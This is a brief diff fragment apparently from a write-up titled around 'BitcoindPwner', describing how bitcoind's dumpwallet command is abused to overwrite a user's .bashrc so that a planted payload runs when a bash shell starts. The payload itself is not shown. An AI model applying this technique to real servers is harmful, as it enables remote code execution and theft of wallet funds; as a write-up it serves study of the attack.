@@ -119,3 +119,6 @@ dumpwallet /home/user/.bashrc
   "filename": "/home/user/projects/BitcoindPwner/bitcoin-0.20.1/bin/test"
 }
 ```
+
+### Now we wait
+A trap has been laid out, we now only require a bash shell to be spawned on the server which loads our malicious `.bashrc` which in turn trigger our malicious payload.
